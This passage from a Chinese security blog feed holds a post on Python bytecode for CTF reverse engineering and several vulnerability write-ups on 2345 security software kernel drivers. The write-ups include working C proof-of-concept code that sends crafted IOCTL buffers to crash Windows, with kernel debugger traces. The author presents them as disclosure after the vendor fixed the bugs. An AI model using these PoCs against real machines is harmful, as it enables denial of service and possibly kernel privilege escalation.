9 POP_JUMP_IF_FALSE        33</span><br><span class="line"></span><br><span class="line">55         ...</span><br><span class="line"></span><br><span class="line">67     &gt;&gt;  139 LOAD_FAST              2 (fs)</span><br><span class="line">           142 RETURN_VALUE</span><br><span class="line">70         0 LOAD_CONST               1 (&apos;FLAG&apos;) //另一个函数开始</span><br><span class="line">           3 STORE_FAST               0 (flag)</span><br></pre></td></tr></table></figure> <h3 id="2-函数调用"><a href="#2-函数调用" class="headerlink" title="2.函数调用"></a>2.函数调用</h3><p>函数调用类似于<code>push+call</code>的汇编结构，压栈参数从左到右依次压入（当然不是<code>push</code>，而是读取指令<code>LOAD_xxxx</code>来指定参数）。</p> <p>函数名一般通过<code>LOAD_GLOBAL</code>指令指定，如果是模块函数或者类成员函数通过<code>LOAD_GLOBAL</code>+<code>LOAD_ATTR</code>来指定。</p> <p>先指定要调用的函数，然后压参数，最后通过<code>CALL_FUNCTION</code>调用。</p> <p><code>CALL_FUNCTION</code>后面的值表示有几个参数。</p> <p>支持嵌套调用：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">6           0 LOAD_GLOBAL              0 (int) //int函数</span><br><span class="line">              3 LOAD_GLOBAL              1 (math)//math模块</span><br><span class="line">              6 LOAD_ATTR                2 (sqrt)//sqrt函数</span><br><span class="line">              9 LOAD_FAST                0 (n) //参数</span><br><span class="line">             12 CALL_FUNCTION            1</span><br><span class="line">             15 CALL_FUNCTION            1</span><br><span class="line">             18 STORE_FAST               2 (nroot)</span><br></pre></td></tr></table></figure> <p>这段<code>bytecode</code>转换成<code>python</code>代码就是</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nroot = int(math.sqrt(n)) //其中n是一个局部变量或者函数参数，具体看上下文</span><br></pre></td></tr></table></figure> <h2 id="0x7-其他指令"><a href="#0x7-其他指令" class="headerlink" title="0x7.其他指令"></a>0x7.其他指令</h2><p>其他常见指令，一看就明白，就不具体分析了，更多详细内容请看<a href="https://docs.python.org/2/library/dis.html" target="_blank" rel="noopener">官方文档</a>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">INPLACE_POWER()</span><br><span class="line">Implements in-place TOS = TOS1 ** TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_MULTIPLY()</span><br><span class="line">Implements in-place TOS = TOS1 * TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_DIVIDE()</span><br><span class="line">Implements in-place TOS = TOS1 / TOS when from __future__ import division is not in effect.</span><br><span class="line"></span><br><span class="line">INPLACE_FLOOR_DIVIDE()</span><br><span class="line">Implements in-place TOS = TOS1 // TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_TRUE_DIVIDE()</span><br><span class="line">Implements in-place TOS = TOS1 / TOS when from __future__ import division is in effect.</span><br><span class="line"></span><br><span class="line">INPLACE_MODULO()</span><br><span class="line">Implements in-place TOS = TOS1 % TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_ADD()</span><br><span class="line">Implements in-place TOS = TOS1 + TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_SUBTRACT()</span><br><span class="line">Implements in-place TOS = TOS1 - TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_LSHIFT()</span><br><span class="line">Implements in-place TOS = TOS1 &lt;&lt; TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_RSHIFT()</span><br><span class="line">Implements in-place TOS = TOS1 &gt;&gt; TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_AND()</span><br><span class="line">Implements in-place TOS = TOS1 &amp; TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_XOR()</span><br><span class="line">Implements in-place TOS = TOS1 ^ TOS.</span><br><span class="line"></span><br><span class="line">INPLACE_OR()</span><br><span class="line">Implements in-place TOS = TOS1 | TOS.</span><br></pre></td></tr></table></figure> <p>基础运算还有一套对应的<code>BINARY_xxxx</code>指令，两者区别很简单。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i += 1 //使用INPLACE_xxx</span><br><span class="line">i = i + 1 //使用BINARY_xxxx</span><br></pre></td></tr></table></figure> <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol> <li><a href="https://docs.python.org/2/library/dis.html" target="_blank" rel="noopener">python dis官方文档</a></li> <li><a href="https://www.google.com/search?newwindow=1&amp;client=firefox-b-ab&amp;biw=1920&amp;bih=938&amp;ei=GUSGW4OeEor6wAOt8ZyQCw&amp;q=python+%E2%80%9CROT_THREE%E2%80%9D&amp;oq=python+%E2%80%9CROT_THREE%E2%80%9D&amp;gs_l=psy-ab.3..0i71k1l8.737846.738207.0.738259.3.3.0.0.0.0.0.0..0.0....0...1c.1.64.psy-ab..3.0.0....0.PcHujQY7ZAE" target="_blank" rel="noopener">google搜索dis指令</a></li> <li><a href="https://github.com/vstinner/bytecode" target="_blank" rel="noopener">https://github.com/vstinner/bytecode</a></li> <li><a href="https://blog.hakril.net/articles/2-understanding-python-execution-tracer.html" target="_blank" rel="noopener">https://blog.hakril.net/articles/2-understanding-python-execution-tracer.html</a></li> <li><a href="https://qingyunha.github.io/taotao/" target="_blank" rel="noopener">A Python Interpreter Written in Python</a></li> <li><a href="https://blog.csdn.net/qs9816/article/details/51661659" target="_blank" rel="noopener">https://blog.csdn.net/qs9816/article/details/51661659</a></li> <li><a href="https://github.com/Mysterie/uncompyle2" target="_blank" rel="noopener">https://github.com/Mysterie/uncompyle2</a></li> </ol> <p>转载请注明出处：<a href="https://anhkgg.github.io/python-bytecode/">https://anhkgg.github.io/python-bytecode/</a></p> ]]></content>          <summary type="html">            &lt;h2 id=&quot;0x1-前言&quot;&gt;&lt;a href=&quot;#0x1-前言&quot; class=&quot;headerlink&quot; title=&quot;0x1.前言&quot;&gt;&lt;/a&gt;0x1.前言&lt;/h2&gt;&lt;blockquote&gt; &lt;p&gt;Python 代码先被编译为字节码后，再由Python虚拟机来执行字节码， Python的字节码是一种类似汇编指令的中间语言， 一个Python语句会对应若干字节码指令，虚拟机一条一条执行字节码指令， 从而完成程序执行。&lt;br&gt;Python dis 模块支持对Python代码进行反汇编， 生成字节码指令。&lt;/p&gt; &lt;/blockquote&gt;          </summary>            <category term="CTF" scheme="https://anhkgg.github.io/categories/CTF/"/>                 <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>            <category term="CTF" scheme="https://anhkgg.github.io/tags/CTF/"/>            <category term="逆向" scheme="https://anhkgg.github.io/tags/%E9%80%86%E5%90%91/"/>        </entry>      <entry>     <title>2345内核拒绝服务漏洞（3） - WORD的锅</title>     <link href="https://anhkgg.github.io/vul-2345-3/"/>     <id>https://anhkgg.github.io/vul-2345-3/</id>     <published>2018-07-13T04:25:33.000Z</published>     <updated>2018-07-13T04:26:58.032Z</updated>          <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><ul> <li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="noopener">http://safe.2345.cc/</a></li> <li>版本：v3.7 X64</li> </ul> <p>2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x0022204C)接口处理中，对输入数据校验不严格，精心构造的数据可导致在处理过程中内存拷贝时溢出，然后bsod拒绝服务，甚至可内核提权。</p> <a id="more"></a> <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在<code>IRP_MJ_DEVICE_CONTROL</code>处理函数中，对<code>0x22204C</code>接口进行处理时，有一段拷贝字符串的操作如下所示：</p> <p><img src="http://wx2.sinaimg.cn/mw690/006mu4nKly1ft5604o35nj30jn04k0so.jpg" alt="img"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct _ioctl_buf</span><br><span class="line">&#123;</span><br><span class="line">  WORD len;</span><br><span class="line">  WORD len_;</span><br><span class="line">  DWORD unk2;</span><br><span class="line">  _ioctl_buf_str *ptr;</span><br><span class="line">&#125;;</span><br><span class="line">struct _ioctl_buf_str</span><br><span class="line">&#123;</span><br><span class="line">  wchar_t buf[1];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure> <p><code>a2</code>是一个<code>_ioctl_buf</code>结构（由应用层输入构造而成），<code>len2</code>是输入的另一个字符串的长度，通过<code>a2-&gt;len</code>（2字节）和<code>len2</code>（2字节）计算得到<code>len1</code>，关键在于<code>len1</code>是也一个<code>WORD</code>变量，只有2字节，所以当<code>a2-&gt;len+len2</code>的大小超过<code>WORD</code>溢出之后，会被截断成<code>WORD</code>，截断后的值赋给<code>len1</code>，此时就可能导致<code>len1</code>的值反而小于<code>a2-&gt;len</code>。比如：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xa3d0 + 0xb4f0 = 0x158C0 =&gt;截断=&gt; 0x58C0</span><br><span class="line">0x58C0 &lt; 0xa3d0</span><br></pre></td></tr></table></figure> <p>接着根据<code>len1</code>分配内存<code>p</code>，<code>memmove</code>拷贝<code>a2-&gt;ptr</code>内容到<code>p</code>中，长度按<code>a2-&gt;len</code>，问题就来了，<code>a2-len</code>大于<code>len1</code>时，就会导致拷贝溢出，<code>bsod</code>（写溢出，可控制内容，可以做更多的利用了，这里我不擅长了）。</p> <p>好了，漏洞成因这里就分析完了。</p> <p>下面看一下<code>poc</code>：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">int poc()</span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line"> DWORD BytesReturned = 0;</span><br><span class="line"></span><br><span class="line"> HANDLE h = OpenDevice(&quot;\\\\.\\2345BdPcSafe&quot;);</span><br><span class="line"> if (h == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">  return 1;</span><br><span class="line"> &#125;</span><br><span class="line">    //过白名单检查</span><br><span class="line"> if (!BypassChk(h)) &#123;</span><br><span class="line">  return 1;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">//BSOD</span><br><span class="line"> DWORD ctlcode = 0x22204C;</span><br><span class="line">#pragma pack(push, 1)</span><br><span class="line"> struct _ioctl_buf_in</span><br><span class="line"> &#123;</span><br><span class="line">  DWORD unk1;</span><br><span class="line">  DWORD unk2;//4</span><br><span class="line">  DWORD offset1;//8 =0x18</span><br><span class="line">  DWORD offset2;//c =A3E8</span><br><span class="line">  DWORD offset3;//10</span><br><span class="line">  DWORD unk3;//14</span><br><span class="line">  char buf1[0xa3d0];//18</span><br><span class="line">  char buf2[0xb4f0];//18+a3d0 </span><br><span class="line"> &#125;; //0x158D8</span><br><span class="line">#pragma pack(pop)</span><br><span class="line"></span><br><span class="line"> _ioctl_buf_in buff = &#123; 0 &#125;;</span><br><span class="line"> buff.unk1 = 4;</span><br><span class="line"> buff.unk3 = 4;</span><br><span class="line"> buff.offset1 = 0x18;</span><br><span class="line"> buff.offset2 = (char*)&amp;buff.buf2 - (char*)&amp;buff;</span><br><span class="line"> buff.offset3 = 0;</span><br><span class="line"> memset(buff.buf1, 0x41, 0xa3d0);</span><br><span class="line"> memset(buff.buf2, 0x41, 0xb4f0);</span><br><span class="line"></span><br><span class="line"> if(!DeviceIoControl(h, ctlcode, &amp;buff, sizeof(_ioctl_buf_in), &amp;buff, 0, &amp;BytesReturned, NULL)) &#123;</span><br><span class="line">  printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</span><br><span class="line"> &#125;</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>其中<code>buff.buf1</code>和<code>buff.buf2</code>的长度<code>0xa3d0 + 0xb4f0 = 0x158c0</code>（截断）就是<code>a2-&gt;len</code>(<code>0x58c0</code>)，<code>buff.buf2</code>的长度<code>b4f0</code>就是<code>len2</code>。</p> <p>我们在调试中看一下计算结果，可以清晰看到<code>len1=0xdb2 &lt; 0x58c0(a2-&gt;len)</code>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x561c:</span><br><span class="line">fffff880`0540561c 660307          add     ax,word ptr [rdi]</span><br><span class="line">0: kd&gt; r rdi</span><br><span class="line">rdi=fffffa8026539658</span><br><span class="line">0: kd&gt; dw fffffa8026539658 l1</span><br><span class="line">fffffa80`26539658  58c0</span><br><span class="line">//a2-&gt;len = 0x58c0</span><br><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x561f:</span><br><span class="line">fffff880`0540561f 664103c1        add     ax,r9w</span><br><span class="line">0: kd&gt; r rax</span><br><span class="line">rax=00000000000058c2</span><br><span class="line">//len2 = 0xb4f0</span><br><span class="line">0: kd&gt; r r9</span><br><span class="line">r9=000000000000b4f0</span><br><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x5623:</span><br><span class="line">fffff880`05405623 0fb7d0          movzx   edx,ax</span><br><span class="line">0: kd&gt; r rax</span><br><span class="line">rax=0000000000000db2</span><br><span class="line">//len1 = 0xdb2</span><br><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x562a:</span><br><span class="line">fffff880`0540562a ff15b80e0300    call    qword ptr [2345BdPcSafe+0x364e8 (fffff880`054364e8)]</span><br><span class="line">0: kd&gt; dq fffff880`054364e8 l1</span><br><span class="line">fffff880`054364e8  fffff800`03ff70e0</span><br><span class="line">0: kd&gt; u fffff800`03ff70e0</span><br><span class="line">nt!ExAllocatePoolWithTag:</span><br><span class="line">fffff800`03ff70e0 fff5            push    rbp</span><br><span class="line">0: kd&gt; r rcx;r rdx;r r8</span><br><span class="line">rcx=0000000000000001</span><br><span class="line">rdx=0000000000000db2</span><br><span class="line">r8=0000000035343332</span><br><span class="line">//参数：p = ExAllocatePoolWithTag(1, 0xdb2, 0x35343332);</span><br></pre></td></tr></table></figure> <h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这个漏洞主要是对输入参数结构体的长度字段校验不够严谨，导致变量溢出截断出现意外的大小结果导致了漏洞的产生。</p> <p>该系列后续会继续分析其他原因引起的漏洞，如有兴趣，敬请期待！</p> <p>转载请注明出处：<a href="https://anhkgg.github.io/vul-2345-3/">https://anhkgg.github.io/vul-2345-3/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h1&gt;&lt;ul&gt; &lt;li&gt;软件网址：&lt;a href=&quot;http://safe.2345.cc/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://safe.2345.cc/&lt;/a&gt;&lt;/li&gt; &lt;li&gt;版本：v3.7 X64&lt;/li&gt; &lt;/ul&gt; &lt;p&gt;2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x0022204C)接口处理中，对输入数据校验不严格，精心构造的数据可导致在处理过程中内存拷贝时溢出，然后bsod拒绝服务，甚至可内核提权。&lt;/p&gt;          </summary>            <category term="vul" scheme="https://anhkgg.github.io/categories/vul/"/>                 <category term="vul" scheme="https://anhkgg.github.io/tags/vul/"/>            <category term="exploit" scheme="https://anhkgg.github.io/tags/exploit/"/>            <category term="fuzz" scheme="https://anhkgg.github.io/tags/fuzz/"/>        </entry>      <entry>     <title>2345内核拒绝服务漏洞（2）</title>     <link href="https://anhkgg.github.io/vul-2345-2/"/>     <id>https://anhkgg.github.io/vul-2345-2/</id>     <published>2018-07-08T03:15:49.000Z</published>     <updated>2018-07-08T03:18:23.919Z</updated>          <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><ul> <li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="noopener">http://safe.2345.cc/</a></li> <li>版本：v3.7 X64</li> </ul> <p>2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x002220E4)接口处理中，对输入数据校验不严格，可构造数据中包含非法地址导致访问违例，然后bsod拒绝服务。</p> <a id="more"></a> <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在<code>IRP_MJ_DEVICE_CONTROL</code>处理函数中，对<code>0x2220E4</code>接口进行处理时如下所示：</p> <p><img src="http://wx1.sinaimg.cn/mw690/006mu4nKly1ft28yb8ym6j30mu03p747.jpg" alt="img"></p> <p><code>InputBuf</code>是应用层传入的输入缓存内容，校验<code>InputBuf</code>是否为空，长度是否超过8字节，然后通过<code>MmIsAddressValid</code>验证地址是否合法，合法后通过偏移16访问该内存内容是否等于标记<code>li7p</code>。</p> <p>问题就出在这里，<code>MmIsAddressValid</code>并不能验证一个内存某范围内是否可读可写，仅仅只能验证该地址读写是否会触发一个页错误。</p> <p>所以我们就可以构造一个可通过<code>MmIsAddressValid</code>验证并且地址16偏移不可读的内存作为输入，造成bsod。</p> <p>看下面的poc代码，通过<code>VirtualAlloc</code>分配一个页大小的内存，可读可写，然后计算页地址尾地址-4作为输入缓存的ptr，这样<code>MmIsAddressValid</code>可通过校验，再内核读取ptr+16偏移时地址已经超过该页内存范围，不可访问，导致bsod。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">int poc()</span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line"> DWORD BytesReturned = 0;</span><br><span class="line"></span><br><span class="line"> HANDLE h = OpenDevice(&quot;\\\\.\\2345BdPcSafe&quot;);</span><br><span class="line"> if (h == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">  return 1;</span><br><span class="line"> &#125;</span><br><span class="line">    //过白名单检查</span><br><span class="line"> if (!BypassChk(h)) &#123;</span><br><span class="line">  return 1;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> //BSOD</span><br><span class="line"> DWORD ctlcode = 0x2220E4;</span><br><span class="line">#pragma pack(push,1)</span><br><span class="line"> struct _ioctl_buf_in</span><br><span class="line"> &#123;</span><br><span class="line">   __int64 ptr;</span><br><span class="line"> &#125;;</span><br><span class="line">#pragma pack(pop)</span><br><span class="line"> _ioctl_buf_in buff = &#123; 0 &#125;;</span><br><span class="line">    </span><br><span class="line">    //分配一个页，可读可写，将该页地址尾地址-4作为输入缓存的ptr</span><br><span class="line">    //然后读取+16偏移时地址已经越过该页内存范围，不可访问，bsod</span><br><span class="line"> PVOID ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"> memset(ptr, 0x41, 0x1000);//</span><br><span class="line"> buff.ptr = (__int64)ptr + 0x1000 - 0x4;</span><br><span class="line"></span><br><span class="line"> if(!DeviceIoControl(h, ctlcode, &amp;buff, sizeof(_ioctl_buf_in), &amp;buff, sizeof(_ioctl_buf_in), &amp;BytesReturned, NULL)) &#123;</span><br><span class="line">  printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</span><br><span class="line"> &#125;</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>看看内存更加清晰，<code>buff</code>地址是<code>003efea0</code>，<code>buff.ptr</code>的值是<code>00030ffc</code>，可以清楚看到<code>00030ffc</code>+16偏移处肯定是不可读的了。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0: kd:x86&gt; dd 003efe3c </span><br><span class="line">00000000`003efe3c  003efe68 75db3237 00000030 002220e4</span><br><span class="line">00000000`003efe4c  003efea0 00000008 003efea0 00000008</span><br><span class="line">0: kd:x86&gt; dd 003efea0 </span><br><span class="line">00000000`003efea0  00030ffc 00000000 01234808 003efef8</span><br><span class="line">0: kd:x86&gt; dd 00030ffc </span><br><span class="line">00000000`00030ffc  41414141 ???????? ???????? ????????</span><br><span class="line">00000000`0003100c  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure> <h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这个漏洞算是前一个的延申，依然是应用层传入内容中包括内存地址，也加入了内存合法性验证代码，但是却没什么用，并没有验证到要访问的内存处的合法性，这个疏漏导致了漏洞的产生。</p> <p>更好的验证内存合法性的函数应该使用<code>ProbeForRead(p, len, x)</code>，可以验证一个范围内内存的合法性，更加严谨，能更好的避免漏洞的产生。</p> <p>稍微总结一下，应用层传入内容结构越复杂，越容易出现问题。这个漏洞出现的位置，本来应该是2345接口协议验证的代码，是为了增加安全性的，却不想成为了安全性问题的原因。</p> <p>该系列后续会继续分析其他原因引起的漏洞，如有兴趣，敬请期待！</p> <p>转载请注明出处：<a href="https://anhkgg.github.io/vul-2345-2/">https://anhkgg.github.io/vul-2345-2/</a></p> <p><strong>参考</strong></p> <ol> <li><a href="https://www.cnblogs.com/Ox9A82/p/5571217.html" target="_blank" rel="noopener">如何验证一个地址可否使用—— MmIsAddressValid函数分析</a></li> <li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-mmisaddressvalid" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-mmisaddressvalid</a></li> </ol> ]]></content>          <summary type="html">            &lt;h1 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h1&gt;&lt;ul&gt; &lt;li&gt;软件网址：&lt;a href=&quot;http://safe.2345.cc/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://safe.2345.cc/&lt;/a&gt;&lt;/li&gt; &lt;li&gt;版本：v3.7 X64&lt;/li&gt; &lt;/ul&gt; &lt;p&gt;2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x002220E4)接口处理中，对输入数据校验不严格，可构造数据中包含非法地址导致访问违例，然后bsod拒绝服务。&lt;/p&gt;          </summary>            <category term="vul" scheme="https://anhkgg.github.io/categories/vul/"/>                 <category term="vul" scheme="https://anhkgg.github.io/tags/vul/"/>            <category term="exploit" scheme="https://anhkgg.github.io/tags/exploit/"/>            <category term="fuzz" scheme="https://anhkgg.github.io/tags/fuzz/"/>        </entry>      <entry>     <title>2345内核拒绝服务漏洞（1）</title>     <link href="https://anhkgg.github.io/vul-2345-1/"/>     <id>https://anhkgg.github.io/vul-2345-1/</id>     <published>2018-07-08T03:15:39.000Z</published>     <updated>2018-07-08T03:17:28.491Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>已经快2个月了吧，已经忘了是什么原因突然搞起了驱动漏洞，反正就是很有兴致地想挖掘一下驱动漏洞。</p> <p>在网上了解了基本的驱动漏洞挖掘方法，主要是通过ioctl接口进行挖掘，已经有很多相关fuzz工具了，比如<a href="https://github.com/N3mes1s/ioctlbf" target="_blank" rel="noopener">ioctlbf</a>、<a href="https://github.com/k0keoyo/kDriver-Fuzzer" target="_blank" rel="noopener">kDriver-Fuzzer</a>等等。</p> <p>kDriver-Fuzzer的作者k0keoyo在2017年收获了100多个CVE，很牛逼啊，这个已经2018年了，再来挖此种类型的驱动是不是已经晚了啊，心中苦涩啊。</p> <p>不过毕竟也写了几年驱动程序了，不搞搞怎么也说不过去啊，所以开始干！</p> <a id="more"></a> <p>初学者嘛，还是找软柿子捏捏，什么微软、卡巴、小红伞、360、管家先还是别想了，很巧的知道了2345安全软件（此处想笑，毕竟为我贡献了不少…），先啥也不管，IDA一番…</p> <p>很不幸的，没多久2345就被我弄翻了，嗯，听说该公司年代也挺久了，咋这么…</p> <p>经过俩周手工和工具的连番蹂躏，发现2345安全软件驱动共10多个内核拒绝服务漏洞（某些也许可提权），也第一次感受到了拿CVE的感觉（其实怎么感觉都有点waterwater的）…</p> <p>好，前言胡扯差不多就到这里了，本系列将拿2345中几个典型的原因造成的安全漏洞进行一番分析，希望对和我一样的初学者有一定帮助。</p> <p>哦，当然，在连番联系2345客服催促之后，2345终于修复了所有漏洞，所以我才等到这个时候分享文章，分析一些细节应该对他们没什么影响了吧（不过，我可没有所有的都重新验证一遍，申明一下，大家不要拿来干坏事，出事了我概不负责！）</p> <h1 id="漏洞概况"><a href="#漏洞概况" class="headerlink" title="漏洞概况"></a>漏洞概况</h1><ul> <li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="noopener">http://safe.2345.cc/</a></li> <li>版本：v3.7 X86</li> </ul> <p>2345安全软件的驱动2345NetFirewall.sys在ioctl(0x00222014)接口处理中，对输入数据校验不严格，可构造数据中包含非法地址导致访问违例，然后bsod拒绝服务。</p> <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在IRP_MJ_DEVICE_CONTROL处理函数中，对0x222014接口进行处理时如下所示：</p> <p><img src="http://wx2.sinaimg.cn/mw690/006mu4nKly1ft1gtchr61j30cl076jrb.jpg" alt="img"></p> <p><code>InputBuf</code>是应用层传入的输入缓存内容，校验<code>InputBuf</code>是否为空，长度是否超过8字节，然后在<code>memcpy</code>位置直接取<code>InputBuf</code>第一个字段(0偏移)作为目标地址拷贝内容进去，这里未校验第一个字段值作为内存地址的合法性。</p> <p>看到这里是不是有什么邪恶的想法了，把该字段置0，那么<code>memcpy(0, xx, xx)</code>不就bsod了。嗯，有点想多了，2345还是受过一些伤害做过一些自我修复的。</p> <p>看下面，该段代码有异常处理保护，so，0地址bsod不成了（确认该处在3.6版本时被人法克了的，所以补了一下）。</p> <p><img 